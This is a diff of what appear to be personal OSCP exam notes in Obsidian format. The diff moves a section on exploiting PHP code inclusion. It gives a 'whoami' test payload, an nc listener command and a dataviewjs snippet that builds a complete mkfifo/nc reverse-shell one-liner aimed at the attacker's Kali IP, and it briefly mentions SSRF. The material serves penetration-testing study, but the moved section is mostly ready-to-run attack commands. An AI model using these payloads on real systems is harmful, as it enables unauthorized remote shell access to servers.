@@ -121,35 +121,6 @@ Examples :
 
 ---
 
-Look for php code inclusion
-
-Templates
-Pages
-
-Test for php execution
-```
-<?PHP echo system("whoami");?>
-```
-
-If it works, obtain a reverse shell
-
-Start a nc listener
-
-```
-nc -lvnp 4444
-```
-
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
-
-const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-Once shell is obtained, [[4 Shell Upgrade]]
-
----
-
 If a form accepts URL, try Server Side Request Forgery (SSRF), 
 
 ```
@@ -237,3 +208,34 @@ const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 Once shell is obtained, [[4 Shell Upgrade]]
+
+---
+
+Look for php code inclusion
+
+Templates
+Pages
+
+Test for php execution
+```
+<?PHP echo system("whoami");?>
+```
+
+If it works, obtain a reverse shell
+
+Start a nc listener
+
+```
+nc -lvnp 4444
+```
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Once shell is obtained, [[4 Shell Upgrade]]
+
+---
